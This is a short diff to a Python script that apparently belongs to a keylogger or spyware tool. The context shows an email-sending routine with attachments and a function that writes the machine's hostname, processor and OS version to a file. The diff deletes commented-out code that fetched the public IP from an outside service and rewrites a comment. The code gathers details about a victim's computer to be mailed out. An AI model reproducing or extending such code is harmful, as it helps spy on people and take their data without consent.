@@ -59,19 +59,10 @@ def send_email(filename, attachment, sends_to_email_addr):
     s.sendmail(fromaddr, sends_to_email_addr, text)
     s.quit()
 
-#Getting the computer's information, such as the host name, public IPAddress, 
+#Getting the computer's information, such as the host name, computer processor, system type, and machine name
 def computer_infomation():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
-        #Could also get the IP Address, but I do not want to get it sent to email.
-
-        # IPAddress = socket.gethostbyname(hostname)
-        # try:
-        #     public_ip = get("https://api.ipify.org").text
-        #     f.write("Public IP Adrress: " + public_ip)
-        # except Exception:
-        #     f.write("Couldn't get the Public IP Address. Most likely because of max query requests.")
-
         f.write("Hostname: " + hostname + "\n")
         f.write("Processor: " + (platform.processor()) + "\n")
         f.write("System: " + (platform.system()) + " " + (platform.version()) + "\n")
